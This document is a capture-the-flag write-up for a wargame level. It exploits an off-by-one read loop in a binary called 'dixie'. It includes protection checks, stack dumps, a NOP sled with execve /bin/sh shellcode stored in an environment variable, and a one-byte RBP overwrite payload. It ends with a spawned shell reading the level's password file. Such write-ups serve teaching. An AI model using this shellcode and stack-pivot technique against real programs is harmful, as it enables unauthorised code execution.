## Infos on the binary

```shell
level02@rainfall:~$ checksec dixie
[*] '/home/level02/dixie'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX unknown - GNU_STACK missing
    PIE:        No PIE (0x400000)
    Stack:      Executable
    RWX:        Has RWX segments
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

Same protections as previous level.

```shell
level02@rainfall:~$ objdump -R dixie

dixie:     file format elf64-x86-64

DYNAMIC RELOCATION RECORDS
OFFSET           TYPE              VALUE
0000000000403fd8 R_X86_64_GLOB_DAT  __libc_start_main@GLIBC_2.34
0000000000403fe0 R_X86_64_GLOB_DAT  __gmon_start__@Base
0000000000404040 R_X86_64_COPY     stdout@GLIBC_2.2.5
0000000000404000 R_X86_64_JUMP_SLOT  puts@GLIBC_2.2.5
0000000000404008 R_X86_64_JUMP_SLOT  printf@GLIBC_2.2.5
0000000000404010 R_X86_64_JUMP_SLOT  memset@GLIBC_2.2.5
0000000000404018 R_X86_64_JUMP_SLOT  read@GLIBC_2.2.5
0000000000404020 R_X86_64_JUMP_SLOT  memcpy@GLIBC_2.14
0000000000404028 R_X86_64_JUMP_SLOT  fflush@GLIBC_2.2.5
```

No sign of an unprotected function like gets() or read() with a smaller buffer.

The source code shows that an 'off-by-one' exploit is possible:
```C
while (in_len <= BUF_SIZE) {
   in_ch = read(0, &buf[in_len], 1);
   if (in_ch <= 0)
      break;
   in_len++;
}
```
the `<=` operator makes the loop read 65 characters where the buffer size is set at `64`

if we use as input a string with  65 characters, the last one will end up in the last byte of RBP register because
of the overflow and that the buffer is located just above RBP in the stack
example using 64 * A + 1 * B:

```shell
0x7fffffffdfa0:	0x4141414141414141	0x4141414141414141
0x7fffffffdfb0:	0x4141414141414141	0x4141414141414141
0x7fffffffdfc0:	0x4141414141414141	0x4141414141414141
0x7fffffffdfd0:	0x4141414141414141	0x4141414141414141
0x7fffffffdfe0:	0x00007fffffffe042
```
we can see that the buffer is filled with `A (41)` and the RBP register `at 0x7fffffffdfe0` ends with `B (42)`

So if we manage to make rbp point to somewhere in the buffer, we can make RSP to later point to RBP + 8:
also in the buffer.

The main issue here is that the call to `dump_records();` after `store_records();` corrupts the buffer and replaces
some of the data:
```shell
0x7fffffffdfa0:	0x4141414141414141	0x4141414141414141
0x7fffffffdfb0:	0x4141414141414141	0x4141414141414141
0x7fffffffdfc0:	0x00007fffffffdfe0	0x000000000040152c
0x7fffffffdfd0:	0x4141414141414141	0x0000000141414141
0x7fffffffdfe0:	0x00007fffffffe042	0x000000000040157a
0x7fffffffdff0:	0x0000006569786964
```
The buffer, that was originally filled with `41` characters now contains trash from the `dump_records()` function

However, the first 4 bytes are untouched. This does not leave enough space to store a shellcode, so we decided to use an environnement variable to store the shellcode, and to make the RSP register point to it.
(We've used a lot of NOP operators before the shellcode to simplify the "aim")

```shell
python3 -c 'import sys; sys.stdout.buffer.write(b"\x90" * 500 + b"\x31\xf6\x56\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\x31\xc0\x66\xb8\x2d\x70\x50\x56\x48\x8d\x44\x24\x08\x50\x57\x48\x89\xe6\x31\xd2\x31\xc0\xb0\x3b\x0f\x05")' > sc

export S=$(cat sc)
```

We struggled a lot on that one, because of the differences between addresses in gdb and the real ones on binary execution. 

```C
#include <stdio.h>
#include <stdlib.h>

int main(int argc, char **argv) {
    char *ptr;

    ptr = getenv(argv[1]);
    if (ptr == NULL) {
        printf("%s not found in environment\n", argv[1]);
        exit(0);
    }
    printf("%s is at %p\n", argv[1], ptr);
    exit(0);
}
```
We can use this small script to figure out the address of the env var outside of gdb:
```shell
level02@rainfall:~$ ./dixit S
S is at 0x7fffffffe46a
```

Let's try to use the address given by the program + a little offset to try to point inside the NOP of the shellcode:
0x7fffffffe46a => 0x7fffffffe47a

```shell
python3 -c 'import sys; sys.stdout.buffer.write(b"A" * 8 + b"\x7a\xe4\xff\xff\xff\x7f\x00\x00" + b"A" * 48 + b"\x00")' > input

(cat input; cat) | ./dixie
  [FLATLINE] The Dixie Flatline lives again.
  [FLATLINE] ROM construct v3.0 — memory interface ready.
  [FLATLINE] Ready: [FLATLINE] Record 0 stored. Checksum: 5a55e665
  [FLATLINE] Record 0: AAAAAAAA_���� (checksum: 5a55e665)
  [FLATLINE] AAAAAAAAAAAAAAAA ���� session closed.
whoami
flag02
cat /home/flag02/.pass
qeplvibynup98phqb312dkvhtpdkklac


```
Success !! we've got the flag
